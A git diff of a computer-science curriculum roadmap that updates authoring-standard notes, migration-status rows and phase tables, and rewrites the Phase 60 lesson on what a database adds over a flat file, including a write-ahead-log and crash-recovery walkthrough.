@@ -79,7 +79,7 @@ Not every lesson uses every row. Binary needs conversion by hand. HCI does not n
 
 Two notes on using this. If you are learning something for the first time, read the elements in order, because the order is the argument. If you are revising something you once knew, go straight to **Why This Matters** and **What This Unlocks Next**: those two elements alone reconstruct the reasoning, and the middle is detail you can reload on demand.
 
-Live lessons below still use older bold labels until rewritten. **Stories IV–VII (Phases 21–59) use the lean / frozen semantic vocabulary** (`WHY THIS MATTERS`, `HOW IT WORKS`, …), which the platform renders as standalone section headings — same reading rhythm as Phase 1, without copying Phase 1’s exact words. Authoring contract: [Learning Content Standard](../standards/LEARNING_CONTENT_STANDARD.md) and [CS Course Profile](../standards/course-profiles/cs.md). Story VIII+ must follow that frozen standard from the start.
+Live lessons below still use older bold labels until rewritten. **Stories IV–VII (Phases 21–59)** follow the lean semantic vocabulary for authors; the renderer keeps **generic checklist labels in flow** (no repeated Why→Problem→How form chrome) and shows **utility chrome** plus **contextual journey headings** when authors write them. **Story VIII (Phases 60–65)** is authored against the amended **invisible-template** from the start — continuous prose, selective contextual headings, utility chrome only for ability/prereq/resources/practice/unlock. Every meaningful lesson ends with a **visible narrative closer** (Practice → What Comes Next → navigation). Authoring contract: [Learning Content Standard](../standards/LEARNING_CONTENT_STANDARD.md) and [CS Course Profile](../standards/course-profiles/cs.md). **Story IX (Phases 66–71)** is authored against the amended **invisible-template** from the start — continuous prose, selective contextual headings, utility chrome only for ability/prereq/resources/practice/unlock, and narrative closers after Practice. **Story X (Phases 72–80)** is authored against the amended **invisible-template** from the start — continuous prose, selective contextual headings, utility chrome only for ability/prereq/resources/practice/unlock, and narrative closers after Practice. **Story XI (Phases 81–88)** is authored against the amended **invisible-template** from the start — continuous prose, selective contextual headings, utility chrome only for ability/prereq/resources/practice/unlock, and narrative closers after Practice. **Story XII (Phases 89–91)** is authored against the amended **invisible-template** from the start — continuous prose, selective contextual headings, utility chrome only for ability/prereq/resources/practice/unlock, and narrative closers after Practice (survey maps, not Story XI depth). **Story XIII (Phases 92–94)** is authored against the amended **invisible-template** from the start — continuous prose, selective contextual headings, utility chrome only for ability/prereq/resources/practice/unlock, and narrative closers after Practice (maintenance workflow: observe → trace → hypothesis → smallest safe change → verify). **Story XIV+ continues under that same amended standard.**
 
 **Diagram conventions.** Diagrams are plain ASCII inside code fences, deliberately, so that they render identically on GitHub, in any editor, in a terminal, and in a diff. Throughout, `|` and `v` mean "then this happens", `+--` joins related paths, `-->` and `->` mean a request or data movement, `X` marks a failure point, and boxes drawn with `+---+` are components or memory regions. Where a diagram shows a sequence over time, time runs downward.
 
@@ -171,6 +171,14 @@ This roadmap is being rebuilt into the 15-story shape above in batches, so that 
 | K     | Teaching-flow audit Stories IV–V + freeze standard (practice catalog; no Story VI)                                                          | Done this turn - audit thin/long/broken; repaired Phase 28 Factory/Decorator/Strategy+Command + Phase 34 deque/practice only; standard FROZEN; Story VI not started |
 | L     | Lean-to-standard rewrite Story VI (Phases 49–54)                                                                                            | Done this turn - frozen Learning Content Standard + CS profile; phase-level Learning Resources; protected FDE/cache/ISA-pipeline/VM/pointers/lang foundations/process-thread/FS/concurrency/syscalls-sockets kept; all 8 playground IDs unique once; nav 48→…→55; 105 phases; Story VII (55+) untouched |
 | M     | Lean-to-standard rewrite Story VII (Phases 55–59)                                                                                           | Done this turn - frozen Learning Content Standard + CS profile; prereq-box rule applied (short orientation); phase-level Learning Resources; protected encapsulation/addressing/TCP-UDP/DNS/HTTP/REST + 54↔56 ownership callout; 5 playground IDs unique once; nav 54→…→60; 105 phases; Story VIII (60+) untouched |
+| N     | Invisible-template amendment (standard + renderer flow/contextual/utility); Story VII representative contextual headings + bridges; 1.2→2.1 continuity; Phase 60 prereq lightened at boundary only | Done prior turn - Story VIII NOT started |
+| O     | Invisible-template rewrite Story VIII (Phases 60–65) — data persistence journey; Story IX untouched | Done this turn - authored against amended standard from the start (contextual headings + bridges; no identical Why→Problem→How skeleton); bookstore running domain; protected WAL/SQL/normalization/B-trees/ACID/replication mechanisms kept; 4 playground IDs unique once; nav 59→…→66; 105 phases; Phase 59/66 bodies unchanged; Story IX (66+) untouched |
+| P     | Narrative closer rule + handoff extractor fix (WHAT THIS UNLOCKS NEXT visible after Practice); Story VIII endings strengthened; Story IX not started | Done this turn |
+| Q     | Invisible-template rewrite Story IX (Phases 66–71) — security/HCI/graphics journey; Story X untouched | Done this turn - authored against amended standard from the start (contextual headings + bridges; no identical Why→Problem→How skeleton); bookstore running domain; defensive security only; protected trust/CIA/STRIDE, hash≠encrypt≠sign, TLS, password hashing, sessions/MFA/RBAC, JWT/OAuth, SQLi/XSS/CSRF/CORS, rate limits, HCI heuristics, render/input loop kept; 4 playground IDs unique once; Projects.md#cs-phase-69-project preserved; nav 65→…→72; 105 phases; Phase 65/72 bodies unchanged; Story X (72+) untouched |
+| R     | Invisible-template rewrite Story X (Phases 72–80) — professional SE journey; Story XI untouched | Done this turn - authored against amended standard from the start (contextual headings + bridges; no identical Why→Problem→How skeleton); depth preferred over cut %; spurious Phase-72 ## PR labels fixed to bold prose; protected Git/requirements/pyramid/architecture/WIP/CI-CD/containers/cloud/observability mechanisms kept; 5 playground IDs unique once; Projects.md#cs-phase-75-project and #cs-phase-77-project + Git.md companion preserved; nav 71→…→81; 105 phases; Phase 71/81 bodies unchanged; Story XI (81+) untouched |
+| S     | Invisible-template rewrite Story XI (Phases 81–88) — system design & distributed systems; Story XII untouched | Done this turn - authored against amended standard from the start (contextual headings + bridges; no identical Why→Problem→How skeleton); depth preferred over cut %; strengthened thin 82–84/87; trimmed chrome/farms on 85–86/88 without gutting CAP/PACELC/consensus/walkthrough; protected estimation/bottleneck/cache-aside/queues/CAP≠ACID C/Raft intuition/reliability/88 learning capstone kept; 5 playground IDs unique once; Projects.md#cs-phase-86-project and #cs-phase-88-project preserved; nav 80→…→89; 105 phases; Phase 80/89 bodies unchanged; Story XII (89+) untouched |
+| T     | Invisible-template rewrite Story XII (Phases 89–91) — AI/platforms/ethics survey; Story XIII untouched | Done this turn - authored against amended standard from the start (contextual headings + bridges; no identical Why→Problem→How skeleton); survey maps preferred over Story XI depth; removed SEE IT farms / legacy chrome; kept + slightly strengthened first-timer distinctions, comparison tables, diagrams, playgrounds; no encyclopedia inflation; 3 playground IDs unique once; no Projects.md cards; nav 88→89→90→91→92; 105 phases; Phase 88/92 bodies unchanged; Story XIII (92+) untouched |
+| U     | Invisible-template rewrite Story XIII (Phases 92–94) — maintenance workflow; Story XIV untouched | Done this turn - authored against amended standard from the start (contextual headings + bridges; no identical Why→Problem→How skeleton); grew thin/checklist XIII for teaching quality (observe→trace→hypothesis→smallest safe change→verify); Quarry Bookstore running scenario; protected onboarding map, characterization+seams, refactor-vs-rewrite, light deprecation/compat, debt-as-risk, ADR scaffold; healthy callbacks to 74/75/73 only; 3 playground IDs unique once; no Projects.md cards; nav 91→92→93→94→95; 105 phases; Phase 91/95 bodies unchanged; Story XIV (95+) untouched |
 
 
 Every phase number in the Phase Index below now has a real, permanent home in this document. Rows marked "current" already have a body section at that number - the prose there is the relocated original, not yet rewritten to the newer template. Rows with no annotation are "planned": the number is reserved and linked from elsewhere, but the section has not been written yet and will appear in the batch noted in [Migration status](#migration-status).
@@ -294,12 +302,12 @@ Every phase number in the Phase Index below now has a real, permanent home in th
 
 | #   | Phase                                     | Goal                    | Ready to continue when...                                  |
 | --- | ----------------------------------------- | ----------------------- | ---------------------------------------------------------- |
-| 60  | Database Foundations *(current)* | Why files aren't enough | Explain what a database adds over a flat file              |
-| 61  | SQL *(current)*                 | Joins + aggregation     | Write a JOIN with GROUP BY/HAVING or a CTE correctly       |
-| 62  | Data Modeling *(current)*       | Normalize a schema      | Design a normalized schema and justify a denormalization   |
-| 63  | Database Internals *(current)*  | Indexes, B-trees        | Explain why an index speeds up one query and slows another |
-| 64  | Transactions & Concurrency *(current)* | ACID under load         | Explain an isolation level and a race it prevents          |
-| 65  | Operating & Scaling Databases *(current)* | Replication, sharding   | Contrast replication vs partitioning vs sharding           |
+| 60  | Database Foundations *(current, invisible-template)* | Why files aren't enough | Explain what a database adds over a flat file              |
+| 61  | SQL *(current, invisible-template)*                 | Joins + aggregation     | Write a JOIN with GROUP BY/HAVING or a CTE correctly       |
+| 62  | Data Modeling *(current, invisible-template)*       | Normalize a schema      | Design a normalized schema and justify a denormalization   |
+| 63  | Database Internals *(current, invisible-template)*  | Indexes, B-trees        | Explain why an index speeds up one query and slows another |
+| 64  | Transactions & Concurrency *(current, invisible-template)* | ACID under load         | Explain an isolation level and a race it prevents          |
+| 65  | Operating & Scaling Databases *(current, invisible-template)* | Replication, sharding   | Contrast replication vs partitioning vs sharding           |
 
 
 ### Story IX - Security & Human-Centered Software
@@ -307,12 +315,12 @@ Every phase number in the Phase Index below now has a real, permanent home in th
 
 | #   | Phase                                      | Goal                         | Ready to continue when...                             |
 | --- | ------------------------------------------ | ---------------------------- | ----------------------------------------------------- |
-| 66  | Security Foundations *(current)*           | Threats, trust boundaries, CIA | Name trust boundaries and a light STRIDE threat        |
-| 67  | Cryptography for Developers *(current)*    | Hash / encrypt / sign + TLS    | Explain hashing vs encryption vs signing; sketch TLS   |
-| 68  | Authentication & Authorization *(current)* | Sessions, MFA, RBAC, JWT       | Explain MFA factors and an RBAC permission check       |
-| 69  | Application Security *(current)*           | OWASP basics + rate limits     | Prevent SQLi/XSS/CSRF; apply a basic rate limit        |
-| 70  | Human-Computer Interaction *(current)*     | Software has users           | Critique and redesign a confusing interface           |
-| 71  | Graphics & Interactive Computing *(current)* | Pixels, frames, input        | Explain a basic rendering/input loop                  |
+| 66  | Security Foundations *(current, invisible-template)*           | Threats, trust boundaries, CIA | Name trust boundaries and a light STRIDE threat        |
+| 67  | Cryptography for Developers *(current, invisible-template)*    | Hash / encrypt / sign + TLS    | Explain hashing vs encryption vs signing; sketch TLS   |
+| 68  | Authentication & Authorization *(current, invisible-template)* | Sessions, MFA, RBAC, JWT       | Explain MFA factors and an RBAC permission check       |
+| 69  | Application Security *(current, invisible-template)*           | OWASP basics + rate limits     | Prevent SQLi/XSS/CSRF; apply a basic rate limit        |
+| 70  | Human-Computer Interaction *(current, invisible-template)*     | Software has users           | Critique and redesign a confusing interface           |
+| 71  | Graphics & Interactive Computing *(current, invisible-template)* | Pixels, frames, input        | Explain a basic rendering/input loop                  |
 
 
 ### Story X - Professional Software Engineering
@@ -320,15 +328,15 @@ Every phase number in the Phase Index below now has a real, permanent home in th
 
 | #   | Phase                                                            | Goal                            | Ready to continue when...                                |
 | --- | ---------------------------------------------------------------- | ------------------------------- | -------------------------------------------------------- |
-| 72  | Git & Collaboration *(current, see also* `[Git.md](./Git.md)`*)* | Safe collaboration history      | Review a PR and resolve a merge conflict confidently     |
-| 73  | Requirements Engineering *(current)*                             | Turn ambiguity into a spec      | Write a spec a teammate could build from unaided         |
-| 74  | Testing *(current)*                                              | Prove behavior automatically    | Write a test pyramid and explain what each layer catches |
-| 75  | Software Architecture *(current)*                                | Keep policy independent         | Separate domain logic from I/O in a small service        |
-| 76  | Development Process *(current)*                                  | Ship predictably                | Explain your team's workflow and why each gate exists    |
-| 77  | CI/CD *(current)*                                                | Automate the path to production | Explain a pipeline stage and what it would catch         |
-| 78  | Containers & Deployment *(current)*                              | Package and ship                | Containerize and run a small service                     |
-| 79  | Cloud Fundamentals *(current)*                                   | Shared responsibility           | Explain IaaS/PaaS/SaaS and who owns which risk layer     |
-| 80  | Observability & Production Debugging *(current)*                 | Logs, metrics, traces           | Separate logs/metrics/traces; define a simple SLI/SLO    |
+| 72  | Git & Collaboration *(current, invisible-template; see also* `[Git.md](./Git.md)`*)* | Safe collaboration history      | Review a PR and resolve a merge conflict confidently     |
+| 73  | Requirements Engineering *(current, invisible-template)*                             | Turn ambiguity into a spec      | Write a spec a teammate could build from unaided         |
+| 74  | Testing *(current, invisible-template)*                                              | Prove behavior automatically    | Write a test pyramid and explain what each layer catches |
+| 75  | Software Architecture *(current, invisible-template)*                                | Keep policy independent         | Separate domain logic from I/O in a small service        |
+| 76  | Development Process *(current, invisible-template)*                                  | Ship predictably                | Explain your team's workflow and why each gate exists    |
+| 77  | CI/CD *(current, invisible-template)*                                                | Automate the path to production | Explain a pipeline stage and what it would catch         |
+| 78  | Containers & Deployment *(current, invisible-template)*                              | Package and ship                | Containerize and run a small service                     |
+| 79  | Cloud Fundamentals *(current, invisible-template)*                                   | Shared responsibility           | Explain IaaS/PaaS/SaaS and who owns which risk layer     |
+| 80  | Observability & Production Debugging *(current, invisible-template)*                 | Logs, metrics, traces           | Separate logs/metrics/traces; define a simple SLI/SLO    |
 
 
 ### Story XI - System Design & Distributed Systems
@@ -336,14 +344,14 @@ Every phase number in the Phase Index below now has a real, permanent home in th
 
 | #   | Phase                                 | Goal                                 | Ready to continue when...                                    |
 | --- | ------------------------------------- | ------------------------------------ | ------------------------------------------------------------ |
-| 81  | System Design Foundations *(current)* | How to think + estimate          | Clarify, estimate, draw simplest shape, name next lever      |
-| 82  | Scaling Applications *(current)*      | Handle more load                     | Identify a bottleneck and the fix that removes it            |
-| 83  | Caching *(current)*                   | Trade staleness for speed            | Choose a cache strategy and explain its invalidation risk    |
-| 84  | Asynchronous & Event-Driven Systems *(current)* | Decouple with queues/events  | Explain when a queue beats a direct call                     |
-| 85  | Distributed Systems *(current)*       | CAP + consistency across machines | Explain CAP with a concrete partition (≠ ACID C)           |
-| 86  | Coordination & Consensus *(current)*  | Agree despite failure                | Explain what a consensus algorithm buys you                  |
-| 87  | Reliability Patterns *(current)*      | Survive partial failure              | Explain retries, timeouts, circuit breakers, and their risks |
-| 88  | Complete System Design *(current)*    | Put it all together                  | Run a full system design walkthrough unprompted              |
+| 81  | System Design Foundations *(current, invisible-template)* | How to think + estimate          | Clarify, estimate, draw simplest shape, name next lever      |
+| 82  | Scaling Applications *(current, invisible-template)*      | Handle more load                     | Identify a bottleneck and the fix that removes it            |
+| 83  | Caching *(current, invisible-template)*                   | Trade staleness for speed            | Choose a cache strategy and explain its invalidation risk    |
+| 84  | Asynchronous & Event-Driven Systems *(current, invisible-template)* | Decouple with queues/events  | Explain when a queue beats a direct call                     |
+| 85  | Distributed Systems *(current, invisible-template)*       | CAP + consistency across machines | Explain CAP with a concrete partition (≠ ACID C)           |
+| 86  | Coordination & Consensus *(current, invisible-template)*  | Agree despite failure                | Explain what a consensus algorithm buys you                  |
+| 87  | Reliability Patterns *(current, invisible-template)*      | Survive partial failure              | Explain retries, timeouts, circuit breakers, and their risks |
+| 88  | Complete System Design *(current, invisible-template)*    | Put it all together                  | Run a full system design walkthrough unprompted              |
 
 
 ### Story XII - Other Core Computer Science Areas
@@ -351,9 +359,9 @@ Every phase number in the Phase Index below now has a real, permanent home in th
 
 | #   | Phase                               | Goal                         | Ready to continue when...                                     |
 | --- | ----------------------------------- | ---------------------------- | ------------------------------------------------------------- |
-| 89  | Artificial Intelligence Foundations *(current)* | Broad AI/ML survey (not LLM-only) | Separate search/planning, classical ML, and deep learning |
-| 90  | Specialized Computing Platforms *(current)*     | Platform constraint comparison   | Compare mobile/embedded/edge by scarce resource            |
-| 91  | Computing, Society & Ethics *(current)*         | Ethical engineering scenarios    | Write case responses with stakeholders and mitigations     |
+| 89  | Artificial Intelligence Foundations *(current, invisible-template)* | Broad AI/ML survey (not LLM-only) | Separate search/planning, classical ML, and deep learning |
+| 90  | Specialized Computing Platforms *(current, invisible-template)*     | Platform constraint comparison   | Compare mobile/embedded/edge by scarce resource            |
+| 91  | Computing, Society & Ethics *(current, invisible-template)*         | Ethical engineering scenarios    | Write case responses with stakeholders and mitigations     |
 
 
 ### Story XIII - Maintaining Real Software
@@ -361,9 +369,9 @@ Every phase number in the Phase Index below now has a real, permanent home in th
 
 | #   | Phase                         | Goal                             | Ready to continue when...                                |
 | --- | ----------------------------- | -------------------------------- | -------------------------------------------------------- |
-| 92  | Working in Existing Codebases *(current)* | Read before you write            | Onboard into an unfamiliar codebase and ship a small fix |
-| 93  | Legacy Code & Maintenance *(current)*     | Change code safely without tests | Add a test seam to legacy code before changing it        |
-| 94  | Engineering Communication *(current)*     | Explain decisions, not just code | Write a design doc or ADR for a real decision            |
+| 92  | Working in Existing Codebases *(current, invisible-template)* | Read before you write            | Onboard into an unfamiliar codebase and ship a small fix |
+| 93  | Legacy Code & Maintenance *(current, invisible-template)*     | Change code safely without tests | Add a test seam to legacy code before changing it        |
+| 94  | Engineering Communication *(current, invisible-template)*     | Explain decisions, not just code | Write a design doc or ADR for a real decision            |
 
 
 ### Story XIV - Grand Capstone
@@ -10617,196 +10625,127 @@ An API exposes data across machines - but HTTP remembers nothing between request
 
 **Track:** Data & Security
 
-**WHAT YOU WILL BE ABLE TO DO:** Explain what a database management system adds over a flat file - storage engine, write-ahead log, query planner, concurrency control, and schema enforcement - and name when a document, key-value, column, or graph store is a better fit than relational.
+**WHAT YOU WILL BE ABLE TO DO:** Explain what a database management system adds over a flat file — storage engine, write-ahead log, query planner, concurrency control, and schema enforcement — and name when a document, key-value, column, or graph store fits better than relational.
 
-**WHAT YOU SHOULD KNOW FIRST:** Phase 59 (an API needs somewhere durable between HTTP requests), Phase 50 (pages and the buffer pool sit on the same virtual-memory idea), Phase 53 (races on shared state - databases face the same problem on rows).
+**WHAT YOU SHOULD KNOW FIRST:** Phase 59 — APIs over HTTP (stateless requests).
+
+**LEARNING RESOURCES:**
+
+- [How Databases Find Data So Fast (Database Dive)](https://www.youtube.com/watch?v=whBMD3RP1Hs) — why not just a file
+- [SQLite How It Works](https://www.sqlite.org/arch.html) — pages, WAL, planner in one readable architecture
+- [cstack/db_tutorial](https://github.com/cstack/db_tutorial) — build a tiny DB from scratch
+- [CMU Database Systems (Andy Pavlo)](https://www.youtube.com/playlist?list=PLSE8ODhjZXjbj8BMuIrRcacnQh20hmY9g) — deeper internals track
+- Interactive: [SQLite CLI](https://sqlite.org/cli.html); [DB Fiddle](https://www.db-fiddle.com/)
 
 ## 60.1 From Files to Databases
 
-**WHY YOU ARE LEARNING THIS:** The most obvious way to persist data is a plain file - write records to disk, read them back later. This works for a single-user script, but breaks down almost immediately once real requirements show up.
+Phase 59's API can accept an order and return JSON — then the process restarts and the order is gone. HTTP remembers nothing between requests. A plain file feels like the obvious fix: append a line, read it back later. That works for a single-user script. The moment two requests write at once, a crash interrupts a write, or you need "every order over $100 for Ada," the file stops being a storage strategy and starts being a liability.
 
-**SEE IT BEFORE YOU MEMORIZE IT**
-
-- Best animated explanation: [How Databases Find Data So Fast (Database Dive)](https://www.youtube.com/watch?v=whBMD3RP1Hs) - starts from "why not just a file" and builds up the machinery a database adds
-- Alternative: [7 Must-know Strategies to Scale Your Database (ByteByteGo)](https://www.youtube.com/watch?v=_1IKwnbscQU) - a map of where Phases 63-65 are going; [ACID Properties in Databases With Examples (ByteByteGo)](https://www.youtube.com/watch?v=GAe5oB742dw) *(Composio YouTube)* as a preview of Phase 64
-- Another angle: [CMU Database Systems playlist (Andy Pavlo)](https://www.youtube.com/playlist?list=PLSE8ODhjZXjbj8BMuIrRcacnQh20hmY9g); [Scaling Databases in the AI Era with Andy Pavlo (Striim)](https://www.youtube.com/watch?v=0FiAJ4EKwTs) *(Composio YouTube)*
-- Interactive: [SQLite CLI](https://sqlite.org/cli.html); [DB Fiddle](https://www.db-fiddle.com/); [SQLime](https://sqlime.org/); [SQL Playground (Postgres in-browser)](https://fwdtools.com/sql-playground/) *(Composio web search)*
-- Written: [SQLite How It Works](https://www.sqlite.org/arch.html); [cstack db_tutorial site](https://cstack.github.io/db_tutorial/) *(Composio fetch)*; [Database Internals](https://www.databass.dev/); [DDIA](https://dataintensive.net/)
-- GitHub: [cstack/db_tutorial](https://github.com/cstack/db_tutorial) (~10k★, verified via Composio GitHub); [cmu-db/bustub](https://github.com/cmu-db/bustub) (~5k★ educational RDBMS); [pingcap/talent-plan](https://github.com/pingcap/talent-plan) *(Composio DeepWiki)*
-- Practice: [SQLBolt](https://sqlbolt.com/) *(Composio fetch)*; [Select Star SQL](https://selectstarsql.com/)
-
-**STEP-BY-STEP EXPLANATION**
-
-What a database management system actually adds, beyond a file, is five distinct pieces of machinery, and it is worth naming them separately because each one solves a different problem from the list above.
-
-A **storage engine** decides how bytes are physically arranged. Rather than lines of text, data is organized into fixed-size **pages** (commonly 4 KB, 8 KB, or 16 KB) because disks and the operating system's virtual memory (Phase 50) both work in pages, so aligning to them means one logical read is one physical read. The engine keeps a **buffer pool** in memory holding recently-used pages, which is a cache with an eviction policy, and it is the reason the same query is slow the first time and fast the second.
-
-A **write-ahead log** provides durability and crash recovery. The rule is deceptively simple and enormously consequential: before modifying a page, append a record describing the change to a sequential log, and flush that log to disk. If the machine loses power mid-write, recovery replays the log to finish or undo whatever was in flight. This is what makes the "half-written file" problem structurally impossible, and it is also why databases are much faster than they have any right to be, because sequential appends to a log are dramatically cheaper than random writes scattered across a file.
-
-A **query planner** turns a declarative request into a physical plan. You write what you want; the planner decides whether to scan the table, use an index, and in what order to join. It makes those choices using statistics it maintains about your data, which is why the same query can suddenly become slow after your data distribution changes, and why `EXPLAIN` is the single most useful diagnostic command in this entire phase.
-
-A **concurrency control** mechanism handles the exact race-condition problem from Phase 53, now applied to rows on disk instead of variables in memory. Most modern databases use **multi-version concurrency control**, which keeps multiple versions of each row so readers never block writers and writers never block readers: each transaction sees a consistent snapshot as of the moment it began ([PostgreSQL MVCC intro](https://www.postgresql.org/docs/current/mvcc-intro.html), Composio web search). That is the same "don't mutate shared state in place" instinct from Phase 53, applied to durable rows.
-
-And an **access layer** enforces structure and permissions: a schema that rejects invalid rows, constraints that reject invalid relationships, and a permission system that decides who may read or write what.
-
-The relational model is not the only option, and knowing the alternatives by their trade-offs rather than their marketing is worth real interview points. **Document stores** like MongoDB drop the schema requirement and store nested documents, which is genuinely better when your data is naturally hierarchical and read as a whole unit, and genuinely worse when you need to query across documents or guarantee consistency between them. **Key-value stores** like Redis give you a hash table (Phase 36) with persistence and network access, extremely fast and completely unable to answer any question except "what is at this key." **Column-oriented stores** like ClickHouse store each column contiguously rather than each row, which makes "average of one column across a billion rows" fast and "fetch this one complete row" slow, which is exactly why analytics and transactional workloads use different databases. **Graph databases** like Neo4j make traversals (Phase 41) first-class, so "friends of friends of friends" is cheap instead of being three self-joins. The default answer for a new application is still a relational database, and the reason is that it is the only one of these that gives you strong consistency, flexible ad-hoc queries, and enforced relationships all at once.
-
-**BEFORE VS. AFTER**
+**WHY A FLAT FILE COLLAPSES:**
 
 ```text
-Plain files (e.g. a CSV of users)
-        Problem 1: two processes writing at once can corrupt the file
-        (no built-in concurrency control -- exactly Phase 53's race
-        condition, now happening to data on disk instead of in memory).
-        Problem 2: "find all users older than 30" means reading and
-        scanning the ENTIRE file, every time -- no way to search efficiently.
-        Problem 3: nothing stops inconsistent data (a user record missing
-        a required field) from being written.
-        Problem 4: if the write is interrupted halfway (a crash, a power
-        loss), the file can be left in a corrupted, half-written state.
-
-Database Management System (DBMS)
-        Fix: a dedicated program that owns all reads and writes, enforces
-        structure (a schema), supports indexed fast lookups (Phase 63), and
-        guarantees a write either fully happens or doesn't happen at all
-        (Phase 64, ACID).
-        Trade-off: real infrastructure to run and operate, and a query
-        language to learn, instead of "just open a file."
+Plain file (e.g. orders.csv for a bookstore)
+  Problem 1: two processes appending at once can corrupt the file
+             (Phase 53's race, now permanent on disk).
+  Problem 2: "orders over $100" means reading EVERY byte, every time.
+  Problem 3: nothing rejects a row missing a required field.
+  Problem 4: power loss mid-write can leave a half-written line forever.
 ```
 
-**PICTURE IT LIKE THIS**
+A **database management system (DBMS)** is a dedicated program that owns all reads and writes. It is not "a fancy file." It is five pieces of machinery that each kill one failure mode above.
 
-A plain file is a shoebox of receipts. Adding one is trivial: drop it in. Finding "every receipt over one hundred dollars from March" means taking every receipt out and reading it. If two people reach into the box at the same moment, receipts get bent, misfiled, or dropped. If someone is interrupted halfway through filing a receipt, you may find half a receipt. And nothing stops someone from dropping in a receipt with no date on it.
+**WHAT A DBMS ADDS:**
 
-A database is a records office with a clerk who owns the cabinet. The clerk keeps a card index so "over one hundred dollars from March" is a lookup rather than a search. Only the clerk touches the cabinet, so two requests cannot collide. Every change is written into a bound ledger *before* the cabinet is touched, so if the clerk is interrupted, the next clerk reads the ledger and finishes or reverses the job. And the clerk refuses any receipt missing a required field. You pay for all of this by hiring, housing, and learning to talk to the clerk, which is precisely the trade-off in the block above.
+A **storage engine** arranges bytes into fixed-size **pages** (commonly 4 KB, 8 KB, or 16 KB). Disks and the OS virtual memory (Phase 50) already work in pages, so one logical read is one physical read. The engine keeps a **buffer pool** in memory — recently used pages, with an eviction policy. That is why the same query is slow the first time (cold) and fast the second (warm).
 
-**Internal Working, Step by Step - what a database does that your file-writing code does not:**
+A **write-ahead log (WAL)** provides durability and crash recovery. Before modifying a page, append a record describing the change to a sequential log and flush that log to disk. If power dies mid-write, recovery replays the log to finish or undo whatever was in flight. Half-written rows become structurally impossible. Sequential log appends are also far cheaper than scattering random writes across a data file — which is why databases feel faster than "write twice" suggests.
+
+A **query planner** turns a declarative request into a physical plan: scan the table, use an index, join order. It uses statistics about your data. The same SQL can suddenly slow down when those statistics drift — which is why `EXPLAIN` is the single most useful diagnostic in this story.
+
+**Concurrency control** solves Phase 53's race on durable rows. Most modern engines use **multi-version concurrency control (MVCC)**: keep multiple versions of each row so readers need not block writers and writers need not block readers. Each transaction sees a consistent snapshot. Details deepen in Phase 64.
+
+An **access layer** enforces structure and permissions: a schema that rejects invalid rows, constraints that reject invalid relationships, and who may read or write what.
+
+**FROM FILE WRITE TO COMMITTED CHANGE:**
 
 ```text
 YOUR CODE WRITING TO A FILE:
 
   open("orders.csv", "a")
-  write("9,shipped,2026-08-04\n")     <-- if power dies HERE, you may have
-  close()                                 "9,ship" on disk forever, and no
-                                          way to tell that it is incomplete
-
-  Reading "all orders over $100":
-  for line in open("orders.csv"):     <-- every byte of the file, every time.
-      if float(line.split(",")[2]) > 100:   O(n), unconditionally.
-          ...
+  write("9,shipped,120\n")   <-- if power dies HERE, you may have
+  close()                        "9,ship" on disk forever
 
   Two processes appending at once:
-  process A: seek to end (offset 5000), write 20 bytes
-  process B: seek to end (offset 5000), write 20 bytes   <-- SAME offset
-             -> one write silently overwrites the other, or the bytes
-                interleave into garbage. This is Phase 53's race
-                condition, now permanent because it is on disk.
+  A and B both seek to offset 5000 and write
+  -> one silently overwrites the other, or bytes interleave.
 
-THE SAME WRITE, THROUGH A DATABASE:
+THE SAME WRITE THROUGH A DATABASE:
 
   UPDATE orders SET status='shipped' WHERE id=9;
         |
         v
   [1] PARSE + PLAN
-        The planner looks at its statistics and chooses:
-        "orders has an index on id -> use an index seek, not a scan"
-        This is why you never rewrite the query when an index is added.
+        "orders has an index on id -> seek, not scan"
         |
         v
-  [2] BEGIN a transaction (implicitly, if you did not say so)
-        A transaction id is assigned. Everything below is now all-or-nothing.
+  [2] BEGIN (implicit if you did not say so)
         |
         v
-  [3] WRITE-AHEAD LOG, first, and flushed to disk BEFORE anything else:
-        +-------------------------------------------------------------+
-        | LSN 4412 | txn 88 | page 27 | BEFORE: 'paid' AFTER: 'shipped'|
-        +-------------------------------------------------------------+
-        This is a SEQUENTIAL append, which is ~100x cheaper than a
-        random write. The order matters absolutely: log first, then data.
+  [3] WRITE-AHEAD LOG first, flushed BEFORE data pages change:
+        | LSN 4412 | txn 88 | page 27 | BEFORE: paid AFTER: shipped |
+        Sequential append. Log first, then data. Absolute rule.
         |
         v
-  [4] MODIFY THE PAGE, in the buffer pool, IN MEMORY
-        buffer pool: [page 12][page 27*][page 3][page 91]
-                                   ^ marked "dirty": changed in memory,
-                                     not yet written back to disk
-        The actual disk write happens LATER, in a batch, which is why
-        many small updates cost far less than many small file writes.
+  [4] MODIFY THE PAGE in the buffer pool (memory). Mark dirty.
+        Disk write of the page may happen later, in a batch.
         |
         v
-  [5] COMMIT
-        Append a COMMIT record to the log and flush. The moment that
-        flush returns, the transaction is DURABLE -- even though the
-        data page itself may still only exist in memory.
+  [5] COMMIT: append COMMIT to the log and flush.
+        That flush IS durability — even if the data page is still only
+        in memory.
         |
         v
   [6] Reply "1 row affected"
 
-AND NOW THE CRASH, which is the entire justification for step 3:
-
-  power loss immediately after step 5
-        |
-        v
-  RESTART: the engine reads the write-ahead log from the last checkpoint
-        |
-        +-- txn 88 has a COMMIT record  -> REDO it. Reapply the change
-        |                                   to page 27. Your data is there.
-        |
-        +-- txn 91 has NO commit record -> UNDO it. Roll back every
-                                            partial change it made.
-
-  The result: the database is in a state that is exactly "every committed
-  transaction applied, no uncommitted transaction partially applied."
-  There is no half-written row, ever. That guarantee is what the shoebox
-  cannot give you at any price.
-
-WHY PAGES, AND NOT LINES:
-
-  A DISK (or SSD) cannot read one byte. Its minimum unit is a block.
-  The OS cannot map less than one page (Phase 50). So:
-
-  file-of-lines view:   row 1 | row 2 | row 3 | row 4 | ... unaligned
-                        reading row 3 may straddle two blocks -> 2 reads
-
-  page-organized view:  +---------- page 27 (8 KB) ----------+
-                        | header | row | row | row | ... free|
-                        +------------------------------------+
-                        one read gets you row 3 AND its neighbors,
-                        which the buffer pool then caches for free.
-
-  This is the same locality argument as CPU cache lines in Phase 32,
-  one level down the memory hierarchy, and it is why databases think
-  in pages rather than in records.
+CRASH AFTER STEP 5:
+  Restart reads the WAL from the last checkpoint.
+  txn 88 has COMMIT -> REDO the change to page 27.
+  txn 91 has no COMMIT -> UNDO every partial change.
+  Result: every committed transaction applied; no uncommitted leftovers.
 ```
 
-**WHAT YOU GAIN, WHAT IT COSTS, AND WHERE IT CAN FAIL**
+**PAGES, NOT LINES:**
 
